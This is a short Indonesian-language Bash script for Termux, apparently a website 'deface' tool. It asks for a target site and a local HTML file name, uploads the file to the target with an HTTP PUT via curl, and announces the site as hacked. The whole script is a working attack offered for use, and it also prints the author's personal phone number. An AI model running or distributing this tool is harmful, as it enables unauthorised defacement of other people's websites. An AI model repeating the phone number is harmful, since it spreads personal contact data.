#!/system/xbin/bash
#Mau Recode ijin dulu cok
#mau Recode pm gw 081802886313
blue='\033[34;1m'
red='\033[31;1m'
yellow='\033[33;1m'
green='\033[1;32m'
white='\033[37;1m'
clear
echo  "~ ~ ~ Wellcome To Tools TU4N-Ryu ~ ~ ~" | lolcat
sleep 2
clear
apt update
clear
pkg install curl
clear
figlet -f slant "Loading . . " | lolcat
sleep 3
clear
figlet -f slant "4.0.4" | lolcat
sleep 1
echo -n $red"Anda berkunjung pada tanggal "; date +"%d %B %Y"
sleep 1
echo $blue"-------------------------------------------------"
echo "Author by     : TU4N-Ryu" | lolcat
echo "Contact WA Me : 081802886313" | lolcat
echo " My Team      : ERROR 4.0.4 LIFE NOT FOUND" | lolcat
echo $blue"-------------------------------------------------"
echo " "
sleep 3
echo $yellow"^_^" $red"Masukan link target yg ingin kalian Depes" $yellow"^_^"
echo " " $green
read -p "Masukan Web Target : " target;
echo " "
sleep 2
echo $red"sekarang masukan nama script kalian Contoh 404.html"
echo " "$green
read -p "Masukan Nama Script : " sc;
sleep 2
curl -T /sdcard/$sc $target
clear
sleep 2
echo $red"Silahkan kalian salin Link dibawah ini..."
sleep 1
echo " "
echo $white"#" $red" SITUS TER'HACK " $white": " $target/$sc
